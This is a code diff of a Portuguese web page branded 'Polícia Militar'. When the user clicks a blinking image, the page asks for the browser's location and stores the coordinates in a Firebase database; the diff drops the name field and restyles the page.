@@ -3,23 +3,56 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enviar Localização para Firebase</title>
+<title>Enviar Localização para o Firebase</title>
 <style>
     body {
         font-family: Arial, sans-serif;
         text-align: center;
+        background: black; /* Cor de fundo preta */
+        color: white; /* Cor do texto branca */
+        margin: 0;
+        padding: 0;
     }
-    button {
-        padding: 10px 20px;
-        font-size: 16px;
+
+    #content {
+        max-width: 90%; /* Largura máxima de 90% */
+        margin: 0 auto;
+        padding: 20px;
+        background-color: rgba(0, 0, 0, 0.5); /* Fundo semi-transparente */
+        border-radius: 10px; /* Borda arredondada */
+    }
+
+    img#sendLocationBtn {
+        display: block;
+        margin: 20px auto;
+        width: 100px; /* Largura da imagem */
         cursor: pointer;
+        animation: blink-animation 1s infinite; /* Animação de piscar */
+    }
+
+    @keyframes blink-animation {
+        0% { opacity: 1; } /* 0% de opacidade (totalmente visível) */
+        50% { opacity: 0; } /* 50% de opacidade (invisível) */
+        100% { opacity: 1; } /* 100% de opacidade (totalmente visível) */
+    }
+
+    /* Estilos específicos para telas menores que 600px de largura */
+    @media screen and (max-width: 600px) {
+        #content {
+            padding: 10px; /* Reduz o padding */
+        }
+        img#sendLocationBtn {
+            width: 80px; /* Reduz a largura da imagem */
+        }
     }
 </style>
 </head>
 <body>
-<h1>Enviar Localização para Policia Militar</h1>
-<input type="text" id="nameInput" placeholder="Digite seu nome">
-<button id="sendLocationBtn">Enviar Localização</button>
+<div id="content">
+    <h1>POLÍCIA MILITAR</h1>
+	<h2>CLIQUE NA IMAGEM</h2>
+    <img id="sendLocationBtn" src="raio.png" alt="Enviar Localização" onclick="sendLocation()">
+</div>
 
 <script src="https://www.gstatic.com/firebasejs/8.4.2/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.4.2/firebase-database.js"></script>
@@ -40,18 +73,12 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
-document.getElementById("sendLocationBtn").addEventListener("click", function() {
-    const name = document.getElementById("nameInput").value;
-    if (!name) {
-        alert("Por favor, preencha o campo do nome.");
-        return;
-    }
-
+function sendLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-            saveToFirebase(name, latitude, longitude);
+            saveToFirebase(latitude, longitude);
         }, function(error) {
             console.error("Erro ao obter localização: ", error);
             alert("Erro ao obter localização. Por favor, permita o acesso à sua localização e tente novamente.");
@@ -59,12 +86,11 @@ document.getElementById("sendLocationBtn").addEventListener("click", function() 
     } else {
         alert("Geolocalização não é suportada por este navegador.");
     }
-});
+}
 
-function saveToFirebase(name, latitude, longitude) {
+function saveToFirebase(latitude, longitude) {
     const newKey = firebase.database().ref().child('locations').push().key;
     firebase.database().ref('locations/' + newKey).set({
-        name: name,
         latitude: latitude,
         longitude: longitude
     }).then(function() {
